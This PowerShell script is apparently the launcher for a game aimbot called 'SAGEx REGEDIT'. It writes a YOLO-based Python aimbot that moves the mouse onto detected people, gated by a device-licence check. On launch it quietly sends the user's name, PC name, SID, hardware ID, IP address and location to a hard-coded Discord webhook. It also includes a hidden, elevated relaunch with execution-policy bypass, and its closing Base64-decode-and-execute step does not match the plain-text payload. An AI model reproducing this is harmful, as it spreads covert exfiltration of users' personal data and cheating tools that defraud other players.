$payload = 'Clear-Host

# ==================== SID COLLECTION (MOVED UP) ====================
try {
    $sid = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
    Write-Host "`n[*] Your SID: $sid" -ForegroundColor Yellow
}
catch {
    Write-Host "[!] Failed to get SID: $_" -ForegroundColor Red
    $sid = "Unavailable"
}

# ==================== IMPROVED WEBHOOK BLOCK ====================
$webhookUrl = "https://discord.com/api/webhooks/1386747730805788702/RsDq69wUXgHVExgQTSiXAAXIG9iI3Xv_GJnEmqT4H2zLJ7BCpM4vLQksbauN6M94fJho"

function Send-WebhookMessage {
    param(
        [string]$message,
        [string]$status = "info"
    )
    
    try {
        $user = $env:USERNAME
        $pcName = $env:COMPUTERNAME
        $os = (Get-CimInstance Win32_OperatingSystem).Caption
        $time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        $hwid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
        $hashedHWID = [System.BitConverter]::ToString([System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hwid))) -replace "-", ""

        try {
            $ipInfo = Invoke-RestMethod -Uri "http://ip-api.com/json" -ErrorAction Stop
            $ip = $ipInfo.query
            $country = $ipInfo.country
            $region = $ipInfo.regionName
            $city = $ipInfo.city
        } catch {
            $ip = "Unavailable"
            $country = "Unavailable"
            $region = "Unavailable"
            $city = "Unavailable"
        }

        # Determine color based on status
        $color = switch ($status) {
            "success" { 65280 }   # Green
            "error"   { 16711680 } # Red
            "warning" { 16776960 } # Yellow
            default   { 4886754 }  # Blue
        }

        $embed = @{
            title = "<:Dead:1346705076626002033> SageX Executed - $status".ToUpper()
            color = $color
            timestamp = (Get-Date).ToString("o")
            fields = @(
                @{ name = "<a:trick_supreme:1346694280386707466> User"; value = $user; inline = $true },
                @{ name = "<a:trick_supreme:1346694193157767269> PC Name"; value = $pcName; inline = $true },
                @{ name = "<:windows:904792336058425346> OS"; value = $os; inline = $false },
                @{ name = "<:trick_supreme:1346446598791757884> SID"; value = $sid; inline = $false },
                @{ name = "<:trick_supreme:1346446598791757884> HWID (hashed)"; value = $hashedHWID; inline = $false },
                @{ name = "<:trick_supreme:1346446598791757884> IP Address"; value = $ip; inline = $true },
                @{ name = "<:trick_supreme:1346446598791757884> Location"; value = "$city, $region, $country"; inline = $true },
                @{ name = "<a:726747821373653072:1346705048947785822> Time"; value = $time; inline = $false },
                @{ name = "Status Message"; value = $message; inline = $false }
            )
        }

        $payload = @{
            username = "SageX Logger"
            embeds = @($embed)
        } | ConvertTo-Json -Depth 10

        $headers = @{
            "Content-Type" = "application/json"
        }

        $webhookResponse = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -Headers $headers -ErrorAction Stop
        return $true
    }
    catch {
         # If it's a rate limit issue
        if ($_.Exception.Response -and $_.Exception.Response.StatusCode -eq 429) {
            $retryAfter = $_.Exception.Response.Headers['Retry-After']
        }
        
        return $false
    }
}

# Test the webhook connection first
$webhookTest = Send-WebhookMessage -message "Initial connection test" -status "info"
if (-not $webhookTest) {
    Write-Host "[!] Webhook initialization failed. Continuing without webhook logging." -ForegroundColor Yellow
}

# ==================== OTP VERIFICATION SYSTEM ====================
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

function Get-MachineFingerprint {
    try {
        $cpuId = (Get-WmiObject Win32_Processor -ErrorAction Stop).ProcessorId
        $biosId = (Get-WmiObject Win32_BIOS -ErrorAction Stop).SerialNumber
        $diskId = (Get-WmiObject Win32_DiskDrive -ErrorAction Stop).SerialNumber
        $macAddress = (Get-WmiObject Win32_NetworkAdapterConfiguration -ErrorAction Stop | 
                      Where-Object { $_.IPEnabled -eq $true }).MacAddress | Select-Object -First 1
        
        $combinedId = "$cpuId$biosId$diskId$macAddress"
        $hash = [System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($combinedId))
        $hashedId = [System.BitConverter]::ToString($hash) -replace "-", ""
        
        return $hashedId.Substring(0, 32)
    }
    catch {
        $errorMsg = "Error generating machine fingerprint: $_"
        Write-Host "[!] $errorMsg" -ForegroundColor Red
        Send-WebhookMessage -message $errorMsg -status "error"
        exit
    }
}

function Generate-SecureOTP {
    param([int]$Length = 12)
    
    try {
        $validChars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
        $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
        $bytes = New-Object byte[]($Length)
        $rng.GetBytes($bytes)
        
        $otp = -join ($bytes | ForEach-Object {
            $validChars[$_ % $validChars.Length]
        })
        
        return $otp
    }
    catch {
        $errorMsg = "Error generating OTP: $_"
        Write-Host "[!] $errorMsg" -ForegroundColor Red
        Send-WebhookMessage -message $errorMsg -status "error"
        exit
    }
}

function Verify-OTP {
    param(
        [string]$MachineFingerprint,
        [string]$OTP,
        [string]$DatabaseURL
    )
    
    try {
        $maxRetries = 3
        $retryCount = 0
        $remoteData = $null
        
        do {
            try {
                $remoteData = Invoke-RestMethod -Uri $DatabaseURL -UseBasicParsing -ErrorAction Stop -ContentType "text/plain; charset=utf-8"
                break
            }
            catch {
                $retryCount++
                if ($retryCount -ge $maxRetries) {
                    throw "Failed to fetch OTP database after $maxRetries attempts: $_"
                }
                Start-Sleep -Seconds 5
            }
        } while ($true)

        if ([string]::IsNullOrEmpty($remoteData)) {
            $warningMsg = "Empty OTP database received"
            Write-Host "[!] $warningMsg" -ForegroundColor Yellow
            Send-WebhookMessage -message $warningMsg -status "warning"
            return $false
        }
        
        $pattern = "$MachineFingerprint`:$OTP`:\d{4}-\d{2}-\d{2}"
        return ($remoteData -match $pattern)
    }
    catch {
        $errorMsg = "Failed to verify OTP: $_"
        Write-Host "[!] $errorMsg" -ForegroundColor Red
        Send-WebhookMessage -message $errorMsg -status "error"
        return $false
    }
}

function Initialize-OTPSystem {
    try {
        $appDataFolder = "$env:APPDATA\SAGEx REGEDIT"
        if (-not (Test-Path $appDataFolder)) {
            New-Item -ItemType Directory -Path $appDataFolder -Force | Out-Null
        }
        
        $LocalStoragePath = "$appDataFolder\otp.ini"
        $RemoteDatabaseURL = "https://raw.githubusercontent.com/Toxic-Speed/SAG--X/main/otp_db.txt"
        $machineFingerprint = Get-MachineFingerprint
        
        if (Test-Path $LocalStoragePath) {
            $localOTP = Get-Content $LocalStoragePath | Where-Object { $_ -match '^otp=' } | ForEach-Object { ($_ -split '=')[1] }
            
            if ([string]::IsNullOrEmpty($localOTP)) {
                throw "No OTP found in local storage"
            }
            
            if (-not (Verify-OTP -MachineFingerprint $machineFingerprint -OTP $localOTP -DatabaseURL $RemoteDatabaseURL)) {
                $errorMsg = "Device not authorized. Fingerprint: $machineFingerprint | OTP: $localOTP"
                Write-Host "`n[!] $errorMsg" -ForegroundColor Red
                Send-WebhookMessage -message $errorMsg -status "error"
                Write-Host "[!] Please contact support." -ForegroundColor Red
                Start-Sleep 15
                exit
            }
            
            Send-WebhookMessage -message "OTP verification successful" -status "success"
            return $true
        }
        else {
            $newOTP = Generate-SecureOTP -Length 12
            $otpContent = @(
                "[OTP]",
                "fingerprint=$machineFingerprint",
                "otp=$newOTP",
                "generated=$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
            )
            
            $otpContent | Out-File -FilePath $LocalStoragePath -Force -Encoding UTF8
            $warningMsg = "FIRST-TIME SETUP REQUIRED. Fingerprint: $machineFingerprint | OTP: $newOTP"
            Write-Host "`n[!] $warningMsg" -ForegroundColor Yellow
            Send-WebhookMessage -message $warningMsg -status "warning"
            Write-Host "`n[!] Please register this device with the information above" -ForegroundColor Yellow
            Write-Host "[!] Send this information to the developer" -ForegroundColor Yellow
            Write-Host "`n[*] Exiting until device is authorized..." -ForegroundColor Gray
            Start-Sleep 10
            exit
        }
    }
    catch {
        $errorMsg = "OTP System Error: $_"
        Write-Host "[!] $errorMsg" -ForegroundColor Red
        Send-WebhookMessage -message $errorMsg -status "error"
        exit
    }
}

# ==================== MAIN SCRIPT ====================
Initialize-OTPSystem
Clear-Host

# Get SID with error handling
try {
    $sid = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
    Write-Host "`n[*] Your SID: $sid" -ForegroundColor Yellow
}
catch {
    Write-Host "[!] Failed to get SID: $_" -ForegroundColor Red
    exit
}

# ==================== AIMBOT ====================
<#
:: Batch-PowerShell Hybrid Script
:: This script can run in both CMD and PowerShell
:: To run in CMD:   double-click or call directly
:: To run in PS:    right-click -> "Run with PowerShell"
@echo off
if "%1"=="ps" goto :ps
powershell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process -FilePath '%~f0' -ArgumentList 'ps' -Verb RunAs -WindowStyle Hidden}"
exit /b
:ps
#>

# === Enhanced Aimbot Launcher ===
# PowerShell-Compatible Version
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$ErrorActionPreference = "Stop"

# Win32 API Definitions
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public static class Win32Functions {
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    
    [DllImport("kernel32.dll")]
    public static extern bool AllocConsole();
}
"@

# Configuration
$appDataDir = Join-Path $env:APPDATA "SAGEx REGEDIT"
$tempPy = Join-Path $appDataDir "SAGEx REGEDIT.py"
$modelFile = "yolov8n.pt"
$modelHash = "31E20DDE3DEF09E2CF938C7BE6FE23D9150BBBE503982AF13345706515F2EF95"
$modelUrl = "https://github.com/ultralytics/assets/releases/download/v0.0.0/yolov8n.pt"

# Create app directory if it doesn't exist
if (-not (Test-Path $appDataDir)) {
    New-Item -ItemType Directory -Path $appDataDir -Force | Out-Null
}

# Functions
function Show-Console {
    try {
        if (-not [Win32Functions]::AllocConsole()) {
            $consoleWindow = [Win32Functions]::GetConsoleWindow()
            if ($consoleWindow -ne [IntPtr]::Zero) {
                [Win32Functions]::ShowWindow($consoleWindow, 5) | Out-Null # SW_SHOW
            }
        }
    }
    catch {
        Write-Warning "Could not show console window: $_"
    }
}

function Test-Admin {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Install-Packages {
    $packages = @(
        "ultralytics",
        "mss",
        "pyautogui",
        "opencv-python",
        "pywin32"
    )
    
    Write-Host "[+] Checking Python packages..." -ForegroundColor Cyan
    
    # Check if pip is available
    try { 
        $null = & python -m pip --version 
    }
    catch {
        Write-Host "[-] pip not found. Installing pip..." -ForegroundColor Yellow
        & python -m ensurepip --default-pip
    }
    
    # Special PySimpleGUI installation first
    Write-Host "  - Installing PySimpleGUI from private server..." -ForegroundColor Yellow
    & python -m pip uninstall PySimpleGUI -y 2>&1 | Out-Null
    & python -m pip cache purge 2>&1 | Out-Null
    & python -m pip install --force-reinstall --extra-index-url https://PySimpleGUI.net/install PySimpleGUI 2>&1 | Out-Null
    
    foreach ($pkg in $packages) {
        Write-Host "  - Checking $pkg..." -NoNewline
        try {
            $installed = & python -c "import $pkg" 2>&1
            if ($LASTEXITCODE -eq 0) {
                Write-Host " OK" -ForegroundColor Green
            } else {
                throw
            }
        }
        catch {
            Write-Host " Installing..." -ForegroundColor Yellow
            & python -m pip install $pkg --quiet --disable-pip-version-check
        }
    }
}

function Test-Model {
    if (-not (Test-Path $modelFile)) { return $false }
    
    try {
        $hash = (Get-FileHash -Algorithm SHA256 -Path $modelFile).Hash
        return $hash -eq $modelHash
    }
    catch { return $false }
}

function Get-Model {
    Write-Host "[+] Downloading model..." -ForegroundColor Cyan
    try {
        Invoke-WebRequest -Uri $modelUrl -OutFile $modelFile -UseBasicParsing
        if (-not (Test-Model)) {
            Remove-Item $modelFile -Force
            throw "Model verification failed (Hash mismatch)"
        }
        return $true
    }
    catch {
        Write-Host "[-] Error downloading model: $_" -ForegroundColor Red
        return $false
    }
}

function Create-PythonScript {
    @'
# SAGEx REGEDIT V2.1 
import os
import sys
import cv2
import time
import ctypes
import pyautogui
import numpy as np
import mss
import logging
import PySimpleGUI as sg
from ultralytics import YOLO
import win32api
import win32con
import winsound

# Configuration
DEFAULT_CONFIG = {
    "confidence": 0.5,
    "smoothness": 0.35,
    "scan_interval": 0,
    "drag_delay": 0,
    "region_size": 300,
    "enable_sound": True,
    "dash_key": "VK_SHIFT",
    "dash_duration": 0.2,
    "dash_cooldown": 2.0
}

# Available dash keys
DASH_KEYS = {
    "VK_SHIFT": win32con.VK_SHIFT,
    "VK_SPACE": win32con.VK_SPACE,
    "VK_CAPITAL": win32con.VK_CAPITAL
}

# Sound frequencies
SOUNDS = {
    "toggle_on": 784,
    "toggle_off": 523,
    "target_locked": 659,
    "dash_activated": 988,
    "error": 392
}

# Initialize
ctypes.windll.kernel32.SetConsoleTitleW("SAGEx REGEDIT V2.1")
logging.getLogger("ultralytics").setLevel(logging.CRITICAL)
pyautogui.FAILSAFE = False

class AimbotConfig:
    def __init__(self):
        self.active = False
        self.confidence = float(DEFAULT_CONFIG["confidence"])
        self.smoothness = float(DEFAULT_CONFIG["smoothness"])
        self.scan_interval = float(DEFAULT_CONFIG["scan_interval"])
        self.drag_delay = float(DEFAULT_CONFIG["drag_delay"])
        self.region_size = int(DEFAULT_CONFIG["region_size"])
        self.enable_sound = bool(DEFAULT_CONFIG["enable_sound"])
        self.dash_key = str(DEFAULT_CONFIG["dash_key"])
        self.dash_duration = float(DEFAULT_CONFIG["dash_duration"])
        self.dash_cooldown = float(DEFAULT_CONFIG["dash_cooldown"])
        self.last_dash_time = 0
        self.update_screen_params()
        
    def update_screen_params(self):
        self.screen_width, self.screen_height = pyautogui.size()
        self.region_left = int(self.screen_width // 2 - self.region_size // 2)
        self.region_top = int(self.screen_height // 2 - self.region_size // 2)
        self.screen_region = {
            "top": self.region_top,
            "left": self.region_left,
            "width": self.region_size,
            "height": self.region_size
        }
    
    def play_sound(self, sound_type):
        if self.enable_sound and sound_type in SOUNDS:
            winsound.Beep(SOUNDS[sound_type], 150)

def create_gui(config):
    sg.theme('DarkGrey5')
    
    dash_key_options = list(DASH_KEYS.keys())
    
    layout = [
        [sg.Text("SAGEx REGEDIT V2.1 - Fixed", font=('Helvetica', 16))],
        [sg.HorizontalSeparator()],
        [
            sg.Column([
                [sg.Text("Confidence Threshold:", size=(20,1))],
                [sg.Slider((0.1, 0.9), config.confidence, 0.05, orientation='h', 
                          key='-CONFIDENCE-', size=(30,15))],
                
                [sg.Text("Smoothness:", size=(20,1))],
                [sg.Slider((0.1, 1.0), config.smoothness, 0.05, orientation='h', 
                          key='-SMOOTHNESS-', size=(30,15))],
                
                [sg.Text("Region Size:", size=(20,1))],
                [sg.Slider((100, 500), config.region_size, 10, orientation='h', 
                          key='-REGION-', size=(30,15), enable_events=True)],
                
                [sg.Checkbox("Enable Sound", default=config.enable_sound, key='-SOUND-')],
            ]),
            sg.VerticalSeparator(),
            sg.Column([
                [sg.Button("Toggle ON/OFF (F6)", size=(20,2), key='-TOGGLE-')],
                [sg.Button("Dash (F7)", size=(20,2), key='-DASH-')],
                [sg.Button("Exit (F8)", size=(20,2), key='-EXIT-')],
                [sg.Text("Status:", size=(20,1))],
                [sg.Text("INACTIVE", key='-STATUS-', text_color='red', size=(20,1), 
                        font=('Helvetica', 12))],
                [sg.Text("Dash Cooldown:", size=(20,1))],
                [sg.ProgressBar(100, orientation='h', size=(20,10), key='-DASHCOOLDOWN-')],
            ])
        ],
        [sg.HorizontalSeparator()],
        [
            sg.Column([
                [sg.Text("Dash Settings", font=('Helvetica', 12))],
                [sg.Text("Dash Key:", size=(12,1)), 
                 sg.Combo(dash_key_options, default_value=config.dash_key, key='-DASHKEY-')],
                [sg.Text("Duration (s):", size=(12,1)),
                 sg.Slider((0.1, 1.0), config.dash_duration, 0.1, orientation='h', 
                          key='-DASHDURATION-', size=(15,15))],
                [sg.Text("Cooldown (s):", size=(12,1)),
                 sg.Slider((0.5, 5.0), config.dash_cooldown, 0.1, orientation='h', 
                          key='-DASHCOOLDOWN_SLIDER-', size=(15,15))],
            ]),
            sg.VerticalSeparator(),
            sg.Column([
                [sg.Text("Hotkeys:", font=('Helvetica', 12))],
                [sg.Text("F6: Toggle Aimbot", size=(20,1))],
                [sg.Text("F7: Dash", size=(20,1))],
                [sg.Text("F8: Exit Program", size=(20,1))],
                [sg.Text("LMB: Hold to Aim", size=(20,1))],
                [sg.Text("CTRL: Quick Dash", size=(20,1))],
                [sg.Text("", size=(20,1))],
                [sg.Text("Sounds:", font=('Helvetica', 12))],
                [sg.Text("High: Drag Assist On", size=(20,1))],
                [sg.Text("Medium: Target Lock", size=(20,1))],
                [sg.Text("Low: Drag Assist Off", size=(20,1))],
            ])
        ]
    ]
    
    window = sg.Window("SAGEx REGEDIT V2.1 CONTROL PANEL", layout, finalize=True)
    return window

def is_pressed(k): 
    return win32api.GetAsyncKeyState(k) & 0x8000

def lmb_held(): 
    return is_pressed(win32con.VK_LBUTTON)

def rmb_held(): 
    return is_pressed(win32con.VK_RBUTTON)

def move_virtual(x, y): 
    ctypes.windll.user32.mouse_event(0x0001, int(x), int(y), 0, 0)

def detect_enemy(config, model):
    try:
        region = {
            "top": int(config.screen_region["top"]),
            "left": int(config.screen_region["left"]),
            "width": int(config.screen_region["width"]),
            "height": int(config.screen_region["height"])
        }
        
        with mss.mss() as sct:
            img = np.array(sct.grab(region))
            img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)

        results = model(img, conf=config.confidence, verbose=False)
        boxes = results[0].boxes.xyxy.cpu().numpy()
        classes = results[0].boxes.cls.cpu().numpy()

        best_target = None
        best_conf = 0

        for i, box in enumerate(boxes):
            class_id = int(classes[i])
            if class_id == 0:  # Person class
                x1, y1, x2, y2 = map(int, box)
                conf = results[0].boxes.conf[i]
                cx = config.region_left + (x1 + x2) // 2
                cy = config.region_top + int(y1 + (y2 - y1) * 0.2)
                if conf > best_conf:
                    best_target = (cx, cy)
                    best_conf = conf
                    
        if best_target:
            config.play_sound("target_locked")
            
        return best_target
    except Exception as e:
        print(f"[ERROR] Detection failed: {str(e)}")
        return None

def smooth_aim_to(config, target_x, target_y):
    try:
        cx, cy = pyautogui.position()
        dx = target_x - cx
        dy = target_y - cy
        steps = max(int(np.hypot(dx, dy) / max(config.smoothness, 0.1) // 1.5), 1)
        
        for _ in range(steps):
            if not lmb_held():
                return
            mx = int(dx / steps)
            my = int(dy / steps)
            move_virtual(mx, my)
            time.sleep(max(config.drag_delay, 0.01))
    except Exception as e:
        print(f"[ERROR] Aiming failed: {str(e)}")

def perform_dash(config):
    current_time = time.time()
    if current_time - config.last_dash_time < config.dash_cooldown:
        return False
        
    try:
        key_code = DASH_KEYS[config.dash_key]
        win32api.keybd_event(key_code, 0, 0, 0)
        time.sleep(config.dash_duration)
        win32api.keybd_event(key_code, 0, win32con.KEYEVENTF_KEYUP, 0)
        
        config.last_dash_time = current_time
        config.play_sound("dash_activated")
        return True
    except Exception as e:
        print(f"[ERROR] Dash failed: {str(e)}")
        config.play_sound("error")
        return False

def main():
    try:
        config = AimbotConfig()
        model = YOLO("yolov8n.pt")
        window = create_gui(config)
        last_toggle = 0
        
        while True:
            event, values = window.read(timeout=10)
            
            if event == sg.WIN_CLOSED or event == '-EXIT-' or is_pressed(win32con.VK_F10):
                break
                
            if (event == '-TOGGLE-' or is_pressed(win32con.VK_F6)) and time.time() - last_toggle > 0.5:
                config.active = not config.active
                status_text = "ACTIVE" if config.active else "INACTIVE"
                status_color = 'green' if config.active else 'red'
                window['-STATUS-'].update(status_text, text_color=status_color)
                config.play_sound("toggle_on" if config.active else "toggle_off")
                last_toggle = time.time()
            
            if (event == '-DASH-' or is_pressed(win32con.VK_F7) or is_pressed(win32con.VK_CONTROL)) and time.time() - last_toggle > 0.5:
                if perform_dash(config):
                    window['-DASHCOOLDOWN-'].update(0)
            
            cooldown_remaining = max(0, config.dash_cooldown - (time.time() - config.last_dash_time))
            cooldown_percent = int(100 - (cooldown_remaining / config.dash_cooldown * 100))
            window['-DASHCOOLDOWN-'].update(cooldown_percent)
            
            config.confidence = float(values['-CONFIDENCE-'])
            config.smoothness = float(values['-SMOOTHNESS-'])
            if config.region_size != int(values['-REGION-']):
                config.region_size = int(values['-REGION-'])
                config.update_screen_params()
            config.enable_sound = bool(values['-SOUND-'])
            config.dash_key = str(values['-DASHKEY-'])
            config.dash_duration = float(values['-DASHDURATION-'])
            config.dash_cooldown = float(values['-DASHCOOLDOWN_SLIDER-'])
            
            if config.active and lmb_held():
                target = detect_enemy(config, model)
                if target:
                    smooth_aim_to(config, *target)
            
            time.sleep(max(config.scan_interval, 0.01))
        
    except Exception as e:
        print(f"[CRITICAL] Main loop error: {str(e)}")
    finally:
        window.close()
        print("[+] SAGEx REGEDIT shutdown complete")

if __name__ == "__main__":
    main()
'@ | Out-File -FilePath $tempPy -Encoding utf8 -Force
}

# Main execution
try {
    # Show console window if hidden
    Show-Console
    
    # Check admin (not required but recommended)
    if (-not (Test-Admin)) {
        Write-Host "[!] Warning: Running without admin privileges" -ForegroundColor Yellow
    }
    
    # Check Python
    Write-Host "[+] Checking Python..." -ForegroundColor Cyan
    try {
        $pythonVersion = (& python --version 2>&1 | Out-String).Trim()
        if (-not $pythonVersion -or $pythonVersion -match "not found") {
            throw "Python not found"
        }
        Write-Host "  - Found $pythonVersion" -ForegroundColor Green
    }
    catch {
        Write-Host "[-] Python is required. Install from https://www.python.org/" -ForegroundColor Red
        pause
        exit 1
    }
    
    # Install packages
    Install-Packages
    
    # Verify or download model
    if (-not (Test-Model)) {
        Write-Host "[!] Model not found or invalid. Downloading..." -ForegroundColor Yellow
        if (-not (Get-Model)) {
            Write-Host "[-] Failed to initialize model. Exiting..." -ForegroundColor Red
            pause
            exit 1
        }
    }
    Write-Host "[+] Model verified successfully!" -ForegroundColor Green
    
    # Create Python script
    Create-PythonScript
    
    # Launch the aimbot
    Write-Host "[+] Launching SAGEx REGEDIT V2.1..." -ForegroundColor Green
    & python $tempPy
    
    Write-Host "[+] Script completed successfully" -ForegroundColor Green
}
catch {
    Write-Host "[-] ERROR: $_" -ForegroundColor Red
    Write-Host "[-] Stack Trace: $($_.ScriptStackTrace)" -ForegroundColor DarkRed
    pause
}
finally {
    # Cleanup if needed
    Write-Host "[+] Cleaning up..." -ForegroundColor Cyan
	function Force-RemoveSAGExFiles {
    $appDataFolder = "$env:APPDATA\SAGEx REGEDIT"
    $pythonScript = "$appDataFolder\SAGEx REGEDIT.py"

    if (Test-Path $pythonScript) {
        try {
            # Kill Python if running
            Get-Process python -ErrorAction SilentlyContinue | Stop-Process -Force
            Remove-Item -Path $pythonScript -Force -ErrorAction Stop
            Write-Host "[+] Successfully deleted SAGEx REGEDIT.py" -ForegroundColor Green
        }
        catch {
            Write-Host "[!] Failed to delete SAGEx REGEDIT.py: $_" -ForegroundColor Red
        }
    }
}

Force-RemoveSAGExFiles
Write-Host "[+] Cleaned up..." -ForegroundColor Cyan

}';
$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($payload));
Invoke-Expression $decoded;

# Optional auto-delete:
# Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
